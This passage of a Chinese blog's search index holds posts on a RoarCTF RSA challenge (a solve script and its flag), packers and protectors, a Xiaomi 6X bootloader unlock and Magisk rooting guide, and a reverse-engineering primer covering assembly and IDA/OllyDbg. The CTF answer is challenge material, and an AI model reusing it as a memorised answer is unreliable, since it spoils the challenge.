class=\"number\">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class=\"line\">e = <span class=\"number\">0x1001</span></span><br><span class=\"line\">c = <span class=\"number\">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fact_mod</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    m = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(b+<span class=\"number\">1</span>, a):</span><br><span class=\"line\">        m = m * i % a</span><br><span class=\"line\">    res = (-gmpy2.invert(m, a)) % a</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sympy.nextprime(res)</span><br><span class=\"line\"></span><br><span class=\"line\">p = fact_mod(A1, B1)</span><br><span class=\"line\">q = fact_mod(A2, B2)</span><br><span class=\"line\">r = n // (p*q)</span><br><span class=\"line\">phi_n = (q-<span class=\"number\">1</span>)*(p-<span class=\"number\">1</span>)*(r-<span class=\"number\">1</span>)</span><br><span class=\"line\">d = gmpy2.invert(e, phi_n)</span><br><span class=\"line\">m = gmpy2.powmod(c, d, n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(m))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># b&#x27;RoarCTF&#123;wm-CongrAtu1ation4-1t4-ju4t-A-bAby-R4A&#125;&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p></li>\r\n</ol>\r\n","categories":["CTF"],"tags":["crypto"]},{"title":"运行时压缩","url":"/2022/09/12/%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9/","content":"<p>运行时压缩器是针对可执行文件而言的，可执行文件内含有解压缩代码。 运行时压缩文件也是PE文件，内部含有PE文件与解码程序。 将普通文件创建成运行时压缩文件的程序称为“压缩器（Packer）”，经反逆向（Anti-Reversing）技术特别处理的压缩器称为保护器（Protector）。</p>\r\n<span id=\"more\"></span>\r\n<h2 id=\"压缩器\">1.压缩器</h2>\r\n<ol type=\"1\">\r\n<li>使用目的\r\n<ol type=\"1\">\r\n<li>减少PE文件的大小</li>\r\n<li>隐藏PE文件内部代码与资源</li>\r\n</ol></li>\r\n<li>使用现状 使用较为广泛，现实实用程序，打补丁文件，普通程序广泛使用运行时压缩</li>\r\n<li>压缩器种类</li>\r\n</ol>\r\n<blockquote>\r\n<p>目的纯粹的压缩器：UPX，ASPack等 目的不存的压缩器：UPack，PESpin、NSAnti等</p>\r\n</blockquote>\r\n<h2 id=\"保护器\">2. 保护器</h2>\r\n<p>PE保护器一类保护PE文件免受代码逆向分析的实用程序。不仅对PE文件进行运行时压缩，同时应用了多种防逆向技术（反调试、反模拟、代码混淆、多态代码、垃圾代码、调试器监视等）。</p>\r\n<ol type=\"1\">\r\n<li><p>使用目的</p>\r\n<ol type=\"1\">\r\n<li>防止破解</li>\r\n<li>保护代码与资源</li>\r\n</ol></li>\r\n<li><p>使用现状</p>\r\n<p>大量运用于对破解很敏感的程序，例如游戏和恶意代码</p></li>\r\n<li><p>保护器种类</p></li>\r\n</ol>\r\n<blockquote>\r\n<p>商用保护器：ASProtect、Themida、SVKP等 公用保护器：UltraProtect、Morphine等</p>\r\n</blockquote>\r\n","categories":["逆向工程核心原理"],"tags":["reverse","book"]},{"title":"小米6X刷机教程","url":"/2022/09/12/%E5%B0%8F%E7%B1%B36X%E5%88%B7%E6%9C%BA%E6%95%99%E7%A8%8B/","content":"<p>最进闲来无事，早就想将手中的<code>小米6X</code>手机刷机了，本以为刷机很简单，却也整整搞了一天才完成，这里记录下刷机的过程。</p>\r\n<h2 id=\"解锁\">解锁</h2>\r\n<p>首先下载<a href=\"https://www.miui.com/unlock/download.html\">官方解锁工具</a>，然后进行以下步骤：</p>\r\n<span id=\"more\"></span>\r\n<ol type=\"1\">\r\n<li>进入“设置 -&gt; 开发者选项 -&gt;\r\n设备解锁状态”中绑定账号和设备；</li>\r\n<li>手动进入Bootloader模式（关机后，同时按住开机键和音量下键）；</li>\r\n<li>通过USB连接手机，点击 “解锁”按钮；</li>\r\n<li>电脑打开解锁工具，使用绑定过手机的账号登录解锁工具，使用USB连接进入了fastboot模式的手机，此时会显示已连接的状态，若未连接，则点击设置，进行驱动检测。</li>\r\n</ol>\r\n<p>连接成功后，点击<strong>解锁</strong>按钮，手机将会进行解锁，但<code>手机内资料将会被清空，记得备份好手机资料</code>。解锁后，手机系统将会恢复出场设置。</p>\r\n<blockquote>\r\n<p>使用USB2.0接口进行连接，否则无法连接到手机</p>\r\n<p>在win11中，打开miflash_unlock.exe后，FastBoot模式下会掉驱动，可以采用以下方法解决<a href=\"#fn1\" class=\"footnote-ref\" id=\"fnref1\" role=\"doc-noteref\"><sup>1</sup></a></p>\r\n</blockquote>\r\n<p>复制以下代码，存为bat脚本，然后右键以管理员权限运行，添加完成后正常关闭窗口，此后再打开<code>miflash_unlock.exe</code>便不会掉驱动了。</p>\r\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\"></span><br><span class=\"line\">reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\usbflags\\<span class=\"number\">18</span>D1D00D0100&quot; /v &quot;osvc&quot; /t REG_BINARY /d &quot;<span class=\"number\">0000</span>&quot; /f</span><br><span class=\"line\"></span><br><span class=\"line\">reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\usbflags\\<span class=\"number\">18</span>D1D00D0100&quot; /v &quot;SkipContainerIdQuery&quot; /t REG_BINARY /d &quot;<span class=\"number\">01000000</span>&quot; /f</span><br><span class=\"line\"></span><br><span class=\"line\">reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\usbflags\\<span class=\"number\">18</span>D1D00D0100&quot; /v &quot;SkipBOSDescriptorQuery&quot; /t REG_BINARY /d &quot;<span class=\"number\">01000000</span>&quot; /f</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">pause</span></span><br></pre></td></tr></table></figure>\r\n<h2 id=\"刷入第三方bootloader\">刷入第三方bootloader</h2>\r\n<p>手机重启，同时按电源键和音量下键，进入fastboot模式，打开电脑上的platform-tools文件夹，在该文件夹下进入cmd命令行或者powershell。</p>\r\n<figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; .\\fastboot.exe flash recovery [recovery.img] </span><br></pre></td></tr></table></figure>\r\n<p>将<code>[recovery.img]</code>替换为想刷入的recovery镜像。</p>\r\n<p>Mi6X可以刷入的recovery为<code>lineage-18.1-20220901-recovery-wayne.img</code>。其他的recovery不保证刷入其他系统后还可以使用。</p>\r\n<h2 id=\"刷入系统\">刷入系统</h2>\r\n<p>刷入lineage_recvoery后，按电源键和音量上键进入recovery模式，</p>\r\n<ol type=\"1\">\r\n<li>进入<code>Factory reset</code>，然后点击<code>Format data/factory reset</code>、<code>Format cache partition</code>和<code>Format system partition</code>；</li>\r\n<li>手机清除后，点击<code>Apply Update</code>，再点击<code>Apply from ADB</code>，此时进入ADB模式；</li>\r\n<li>USB连接电脑，使用adb工具运行命令<code>adb sideload 镜像.zip</code>，此时会自动进行刷入，当刷入成功后，会显示<strong>Total\r\nxfer: 1.00x,</strong>。此时已经成功刷入系统，点击重启即可。</li>\r\n</ol>\r\n<h2 id=\"刷入magisk\">刷入magisk</h2>\r\n<p>FastBoot刷Magisk的优点<a href=\"#fn2\" class=\"footnote-ref\" id=\"fnref2\" role=\"doc-noteref\"><sup>2</sup></a></p>\r\n<ol type=\"1\">\r\n<li>无需第三方Recovery</li>\r\n<li>不影响系统升级（完整包升级）</li>\r\n</ol>\r\n<p>方法：</p>\r\n<ol type=\"1\">\r\n<li><p>安装magisk APP</p></li>\r\n<li><p>从镜像.zip中提取boot.img，放到手机中；（如果系统包里面没有boot.img，只有payload.bin，请参考这个<a href=\"magiskcn.com/payload-boot\">教程</a>提取：)</p></li>\r\n<li><p>打开Magisk【安装 – 选择并修补一个文件 –\r\n弹窗文件管理窗口（找到刚刚提取的boot.img）- 开始】</p></li>\r\n<li><p>修补结束，会生成一个名字为（magisk_patched-版本号_随机字符.img）的文件（每次生成的随机字符都不一样，使用的时候请输入生成的名字），将生成的文件复制到电脑中</p></li>\r\n<li><p>手机进入fastboot模式，连接电脑，使用platform-tools运行如下命令\r\n<code>fastboot flash boot 面具文件</code></p></li>\r\n<li><p>出现下面这三行代码，就是成功刷入了。</p>\r\n<blockquote>\r\n<p>Sending 'boot' (131072 KB) OKAY [ 3.049s] Writing 'boot' OKAY [\r\n0.587s] Finished. Total time: 4.582s</p>\r\n</blockquote></li>\r\n<li><p>重启手机，已经成功刷入面具</p></li>\r\n</ol>\r\n<blockquote>\r\n<p>若想恢复无面具的系统，则按步骤5、6、7刷入从<code>镜像.zip</code>中提取的<code>boot.img</code></p>\r\n</blockquote>\r\n<h2 id=\"刷机包汇总\">刷机包汇总</h2>\r\n<p>MIUI<a href=\"#fn3\" class=\"footnote-ref\" id=\"fnref3\" role=\"doc-noteref\"><sup>3</sup></a></p>\r\n<p>Arrow OS<a href=\"#fn4\" class=\"footnote-ref\" id=\"fnref4\" role=\"doc-noteref\"><sup>4</sup></a></p>\r\n<p>Lineage OS<a href=\"#fn5\" class=\"footnote-ref\" id=\"fnref5\" role=\"doc-noteref\"><sup>5</sup></a></p>\r\n<p>TWRP<a href=\"#fn6\" class=\"footnote-ref\" id=\"fnref6\" role=\"doc-noteref\"><sup>6</sup></a></p>\r\n<p><a href=\"https://github.com/xiaoleGun/android_device_xiaomi_wayne-4.19\">KaleidoscopeOS-unofficial</a></p>\r\n<h2 id=\"恢复系统\">恢复系统</h2>\r\n<ol type=\"1\">\r\n<li>下载系统包（线刷包）；</li>\r\n<li>解压系统包（解压两次，直到出现文件夹）</li>\r\n<li>手机重启进入fastboot模式</li>\r\n<li>连接电脑，打开小米手机助手，点击加载设备，并选择文件夹（第2步解压的文件夹）</li>\r\n<li>点击刷机即可以恢复原系统。</li>\r\n</ol>\r\n<blockquote>\r\n<p>右下角可以选择全部删除、保留用户数据、全部删除并lock三个选项，若选择<code>全部删除并lock</code>，则需要重新解bootloader。</p>\r\n</blockquote>\r\n<aside id=\"footnotes\" class=\"footnotes footnotes-end-of-document\" role=\"doc-endnotes\">\r\n<hr>\r\n<ol>\r\n<li id=\"fn1\"><p>https://blog.csdn.net/gmaaa123/article/details/102882838<a href=\"#fnref1\" class=\"footnote-back\" role=\"doc-backlink\">↩︎</a></p></li>\r\n<li id=\"fn2\"><p><a href=\"https://magiskcn.com/\" class=\"uri\">https://magiskcn.com/</a><a href=\"#fnref2\" class=\"footnote-back\" role=\"doc-backlink\">↩︎</a></p></li>\r\n<li id=\"fn3\"><p>https://www.miuistore.com/<a href=\"#fnref3\" class=\"footnote-back\" role=\"doc-backlink\">↩︎</a></p></li>\r\n<li id=\"fn4\"><p>https://arrowos.net/download<a href=\"#fnref4\" class=\"footnote-back\" role=\"doc-backlink\">↩︎</a></p></li>\r\n<li id=\"fn5\"><p>https://download.lineageos.org/wayne<a href=\"#fnref5\" class=\"footnote-back\" role=\"doc-backlink\">↩︎</a></p></li>\r\n<li id=\"fn6\"><p>https://dl.twrp.me/wayne/<a href=\"#fnref6\" class=\"footnote-back\" role=\"doc-backlink\">↩︎</a></p></li>\r\n</ol>\r\n</aside>\r\n","categories":["Life"],"tags":["刷机"]},{"title":"逆向工程","url":"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/","content":"<h3 id=\"什么是逆向工程\">什么是逆向工程</h3>\r\n<p>逆向工程（Reversing Engineering，RE）一般指通过分析物体、机械设备或系统，了解其结构、功能、行为等，掌握其原理并改善不足之处、添加新创意的一系列过程。</p>\r\n<p>代码逆向工程是逆向工程在软件领域中的应用，主要指对软件的结构，流程，算法，代码等进行逆向拆解和分析，其实质就是对软件进行深入细致的分析。</p>\r\n<span id=\"more\"></span>\r\n<h3 id=\"应用领域\">应用领域</h3>\r\n<p>病毒分析、软件（游戏）破解、游戏外挂与反外挂、漏洞挖掘</p>\r\n<h3 id=\"ctf中的逆向\">CTF中的逆向</h3>\r\n<p>涉及Windows、Linux、Android平台的多种编程技术，要求利用常用工具对源代码及二进制文件进行逆向分析，掌握Android移动应用APK文件的逆向分析、掌握加解密、内核编程、算法、反调试和代码混淆技术。</p>\r\n<h3 id=\"逆向方法\">逆向方法</h3>\r\n<h4 id=\"静态分析法\">静态分析法</h4>\r\n<p>静态分析法是在不执行代码文件的情形下，对代码进行静态分析的一种方法。通过观察代码文件的外部特征，获取文件类型（EXE、DLL、DOC、ZIP等）、大小、PE头信息、导入/导出表、内部字符串、是否运行时解压缩、调试信息等。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171736849.png\" alt=\"ida\"><figcaption aria-hidden=\"true\">ida</figcaption>\r\n</figure>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171754217.png\" alt=\"die\"><figcaption aria-hidden=\"true\">die</figcaption>\r\n</figure>\r\n<h4 id=\"动态分析法\">动态分析法</h4>\r\n<p>动态分析法是在程序文件的执行过程中对代码进行动态分析的一种方法，通过调试来分析代码流，获得内存状态等。通常使用调试器（Debugger）分析软件程序的内部结构和动作原理。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171807828.png\" alt=\"od\"><figcaption aria-hidden=\"true\">od</figcaption>\r\n</figure>\r\n<h3 id=\"ctf软件逆向流程\">CTF软件逆向流程</h3>\r\n<ol type=\"1\">\r\n<li>使用IDA等静态分析工具收集信息，并根据这些静态信息进行搜索</li>\r\n<li>研究程序的保护方法，如代码混淆，保护壳及反调试等技术，并设法破除或绕过保护</li>\r\n<li>反汇编目标软件，快速定位到关键代码进行分析</li>\r\n<li>结合动态调试，验证自己的初期猜想，在分析的过程中理清程序功能</li>\r\n<li>针对程序功能，写出对应脚本，求解出 flag</li>\r\n</ol>\r\n<h2 id=\"逆向工程基础\">逆向工程基础</h2>\r\n<h3 id=\"编译与反编译\">编译与反编译</h3>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171823288.png\" alt=\"assem\"><figcaption aria-hidden=\"true\">assem</figcaption>\r\n</figure>\r\n<p>编译过程可分为4步：</p>\r\n<p>预处理(Preprocessing)、编译(Compliation)、汇编(Assembly)和链接(Linking)。</p>\r\n<ol type=\"1\">\r\n<li>预编译：gcc –E hello.c –o hello.i</li>\r\n<li>编译：gcc –S hello.c –o hello.s</li>\r\n<li>汇编：gcc –c hello.s –o hello.o 或者gcc –c hello.c –o hello.o</li>\r\n<li>链接：gcc hello.c –o hello</li>\r\n</ol>\r\n<p>可以通过-save-temps参数永久保存这些中间编译产生的文件</p>\r\n<p><strong>反编译</strong></p>\r\n<p>反编译并没有标准的工具，无法精确得到源代码文件，一般借助IDA等工具对二进制文件进行反编译。</p>\r\n<h3 id=\"汇编基础\">汇编基础</h3>\r\n<h4 id=\"寄存器\">寄存器</h4>\r\n<p>寄存器属于CPU中的一块存储区域，拥有着非常高的读写速度，而程序运行最重要的就是快。</p>\r\n<p>x86处理器有8个32位通用寄存器：EAX,EBX,ECX,EDX,ESI,EDI称为通用寄存器；ESP,EBP为栈指针寄存器</p>\r\n<p>通用寄存器可以被分段开来使用，可以将EAX的最低2个字节视为16位寄存器AX，还可将EAX的最低1个字节视为8位寄存器AL，最高的1个字节也可视为一个8位寄存器AH；其它寄存器相同。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171857009.png\" alt=\"reg\"><figcaption aria-hidden=\"true\">reg</figcaption>\r\n</figure>\r\n<p>x86_64位处理器下有16个64位寄存器：RAX, RBX, RCX, RDX, RSI, RDI, <em>R8, R9, R10, R11, R12, R13, R14, R15</em>, RSP, RBP，多了8个寄存器。</p>\r\n<h4 id=\"指令\">指令</h4>\r\n<p>计算机是不能直接识别我们所编写的C程序或者Java程序的。它只能识别机器语言，而<strong>机器语言是用二进制代码表示的计算机能直接识别和执行的一种机器指指令系统令的集合</strong>。</p>\r\n<blockquote>\r\n<p>机器语言示例：1000100111011000</p>\r\n</blockquote>\r\n<p>用机器语言编写程序，编程人员要首先熟记所用计算机的全部指令代码和代码的涵义。手编程序时，程序员得自己处理每条指令和每一数据的存储分配和输入输出，还得记住编程过程中每步所使用的工作单元处在何种状态。这是一件十分繁琐的工作。编写程序花费的时间往往是实际运行时间的几十倍或几百倍，而且，编出的程序全是些0和1的指令代码，直观性差，还容易出错。</p>\r\n<p>那么该怎么办呢？这时候<code>汇编语言</code>便产生了。</p>\r\n<p>汇编语言的主体是汇编指令。汇编指令和机器指令的差别在于指令的表示方法上，汇编指令是机器指令便于记忆的书写格式。</p>\r\n<p>比如下面将寄存器 BX 的内容发送到 AX 上：</p>\r\n<blockquote>\r\n<p>操作：寄存器BX的内容送到AX中</p>\r\n<p>1000100111011000 机器指令</p>\r\n<p>mov ax,bx 汇编指令</p>\r\n</blockquote>\r\n<p>我们能很明显的从上面两条指令看出区别，汇编指令相对于机器指令是很容易记住的。</p>\r\n<h5 id=\"数据移动指令\">数据移动指令</h5>\r\n<ul>\r\n<li>mov\r\n<ul>\r\n<li>mov a,b</li>\r\n</ul></li>\r\n<li>Push (入栈)\r\n<ul>\r\n<li>Push &lt;reg</li>\r\n<li>Push &lt;memory</li>\r\n<li>Push &lt;data</li>\r\n</ul></li>\r\n<li>Pop (出栈)\r\n<ul>\r\n<li>Pop &lt;reg</li>\r\n<li>Pop &lt;memory</li>\r\n<li>Pop &lt;data</li>\r\n</ul></li>\r\n<li>Lea\r\n<ul>\r\n<li>Lea &lt;mem ,&lt;reg</li>\r\n</ul></li>\r\n</ul>\r\n<h5 id=\"逻辑运算指令\">逻辑运算指令</h5>\r\n<ul>\r\n<li>Add\r\n<ul>\r\n<li>Add a,b</li>\r\n</ul></li>\r\n<li>Sub\r\n<ul>\r\n<li>Sub a,b</li>\r\n</ul></li>\r\n<li>Inc 、dec(自增、自减)\r\n<ul>\r\n<li>inc &lt;reg</li>\r\n<li>inc &lt;mem</li>\r\n<li>dec &lt;reg</li>\r\n<li>dec &lt;mem</li>\r\n</ul></li>\r\n<li>Imul (整数相乘)\r\n<ul>\r\n<li>Imul a,b</li>\r\n<li>Imul a,b,c</li>\r\n</ul></li>\r\n<li>Idiv (整数相除)\r\n<ul>\r\n<li>Idiv &lt;reg</li>\r\n<li>Idiv &lt;mem</li>\r\n</ul></li>\r\n<li>and 、or、xor (按位与，或，异或)\r\n<ul>\r\n<li>and(or,xor) a,b</li>\r\n</ul></li>\r\n</ul>\r\n<h5 id=\"流程控制指令\">流程控制指令</h5>\r\n<ul>\r\n<li>jmp\r\n<ul>\r\n<li>jmp address</li>\r\n</ul></li>\r\n<li>Jcondition 有条件的跳转\r\n<ul>\r\n<li>je &lt;label ;当相等的时候跳转</li>\r\n<li>jne &lt;label ;当不相等的时候跳转</li>\r\n<li>jz &lt;label ;当最后结果为 0 的时候跳转</li>\r\n<li>jg &lt;label ;当大于的时候跳转</li>\r\n<li>jge &lt;label ;当大于等于的时候跳转</li>\r\n<li>jl &lt;label ;当小于的时候跳转</li>\r\n<li>jle &lt;label ;当小于等于的时候跳转</li>\r\n</ul></li>\r\n</ul>\r\n<h4 id=\"进程内存块\">进程内存块</h4>\r\n<p>进程内存是一个平面地址空间，所有代码和数据都被合并在一起，组成一个很大的组织结构。内容被分割为不同的区块（Setion，又称区段，节等），区段中包含代码或数据，各个区块按照页边界来对齐，区块没有限制大小，是一个连续的结构。每块都有他自己在内存中的属性，比如：这个块是否可读可写，或者只读等。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171914941.png\" alt=\"mem\"><figcaption aria-hidden=\"true\">mem</figcaption>\r\n</figure>\r\n<ol type=\"1\">\r\n<li>bss段（bss segment）通常是指用来存放程序中<strong>未初始化</strong>的全局变量的一块内存区域，bss段属于静态内存分配。</li>\r\n<li>data段：数据段（data segment）通常是指用来存放程序中<strong>已初始化</strong>的全局变量的一块内存区域，数据段属于静态内存分配。</li>\r\n<li>text段：代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</li>\r\n<li>堆（heap）：堆是用于存放进程运行中被<strong>动态分配</strong>的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</li>\r\n<li>栈（stack）：栈又称堆栈，是用户存放程序临时创建的<strong>局部变量</strong>，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存/恢复调用现场。</li>\r\n</ol>\r\n<h3 id=\"逆向工具及使用\">逆向工具及使用</h3>\r\n<h5 id=\"ida-pro\">IDA Pro</h5>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171929358.png\" alt=\"ida_icno\"><figcaption aria-hidden=\"true\">ida_icno</figcaption>\r\n</figure>\r\n<p>工具分为64位和32位版本，分别用于分析64位程序和32位程序。</p>\r\n<p><strong>常用快捷键</strong></p>\r\n<table>\r\n<thead>\r\n<tr class=\"header\">\r\n<th style=\"text-align: left;\">快捷键</th>\r\n<th style=\"text-align: left;\">功能</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td style=\"text-align: left;\">f5</td>\r\n<td style=\"text-align: left;\">一键反编译</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td style=\"text-align: left;\">a</td>\r\n<td style=\"text-align: left;\">将数据转换为字符串</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td style=\"text-align: left;\">esc</td>\r\n<td style=\"text-align: left;\">回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td style=\"text-align: left;\">他窗口按下esc，会关闭该窗口）</td>\r\n<td style=\"text-align: left;\"></td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td style=\"text-align: left;\">shift+f12</td>\r\n<td style=\"text-align: left;\">可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td style=\"text-align: left;\">x</td>\r\n<td style=\"text-align: left;\">对着某个函数、变量按该快捷键，可以查看它的交叉引用</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td style=\"text-align: left;\">g</td>\r\n<td style=\"text-align: left;\">直接跳转到某个地址</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td style=\"text-align: left;\">n</td>\r\n<td style=\"text-align: left;\">更改变量的名称</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td style=\"text-align: left;\">y</td>\r\n<td style=\"text-align: left;\">更改变量的类型</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td style=\"text-align: left;\">/</td>\r\n<td style=\"text-align: left;\">在反编译后伪代码的界面中写下注释</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td style=\"text-align: left;\">\\</td>\r\n<td style=\"text-align: left;\">在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td style=\"text-align: left;\">；</td>\r\n<td style=\"text-align: left;\">在反汇编后的界面中写下注释</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td style=\"text-align: left;\">u</td>\r\n<td style=\"text-align: left;\">undefine，取消定义函数、代码、数据的定义</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td style=\"text-align: left;\">p</td>\r\n<td style=\"text-align: left;\">定义函数</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><strong>常用设置</strong></p>\r\n<blockquote>\r\n<p>菜单栏 &gt; view–&gt;open subviews: 可以恢复你无意中关闭的数据显示窗口</p>\r\n<blockquote>\r\n<p>windows–&gt;reset desktop: 可以恢复初始ida布局</p>\r\n</blockquote>\r\n<blockquote>\r\n<p>option–&gt;font: 可以改变字体的相关属性</p>\r\n</blockquote>\r\n</blockquote>\r\n<blockquote>\r\n<p>在流程视图中添加地址偏移：option–&gt;general -&gt; Line prefixes(graph)</p>\r\n<blockquote>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171946863.png\" alt=\"flow\"><figcaption aria-hidden=\"true\">flow</figcaption>\r\n</figure>\r\n</blockquote>\r\n<blockquote>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913171958437.png\" alt=\"flow2\"><figcaption aria-hidden=\"true\">flow2</figcaption>\r\n</figure>\r\n</blockquote>\r\n<p>自动添加反汇编注释:option–&gt;general -&gt; Auto comments &gt; <img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913172018026.png\" alt=\"comments\"></p>\r\n</blockquote>\r\n<h5 id=\"练习\">练习</h5>\r\n<p>test1</p>\r\n<p>[BUUCTF]REVERSE——reverse2</p>\r\n<p>test2</p>\r\n<h5 id=\"ollydbg\">Ollydbg</h5>\r\n<p><strong>常用快捷键</strong></p>\r\n<table>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>快捷键</th>\r\n<th>功能</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>Ctrl+F1</td>\r\n<td>打开与所选行内符号相关的 API 帮助文档。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>F2</td>\r\n<td>在光标选定位置按 F2 键设置或取消断点。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Shift+F2</td>\r\n<td>在首个选择命令设置条件断点。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+F2</td>\r\n<td>重新启动被调试程序。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>F4</td>\r\n<td>运行到光标选定位置处暂停。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Shift+F4</td>\r\n<td>设置记录断点。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>F5</td>\r\n<td>最大化当前窗口。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+F5</td>\r\n<td>打开与首个选择的命令相对应的源文件。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Alt+F5</td>\r\n<td>让 OllyDbg 窗口总在最前面。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>F6</td>\r\n<td>切换到下一个窗口。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Shift+F6</td>\r\n<td>切换到前一个窗口。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>F7</td>\r\n<td>单步步入，每次执行一条指令，遇到 call 等子程序时进入其中。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Shift+F7</td>\r\n<td>与 F7 相同，但当被调试程序发生异常而中止时，调试器首先尝试步入被调试程序指定的异常处理。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+F7</td>\r\n<td>自动步入，在所有的函数调用中一条一条地执行命令。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Alt+F7</td>\r\n<td>转到上一个找到的参考。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>F8</td>\r\n<td>单步步过，每次执行一条指令，遇到 call 等子程序时不进入其中。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Shift+F8</td>\r\n<td>与 F8 相同，但当被调试程序发生异常而中止时，调试器首先尝试步过被调试程序指定的异常处理。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+F8</td>\r\n<td>自动步过，一条一条执行命令，但不进入函数内部调用。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Alt+F8</td>\r\n<td>转到下一个找到的参考。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>F9</td>\r\n<td>运行，被调试软件继续运行，直到遇到下一个断点。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Shift+F9</td>\r\n<td>与 F9 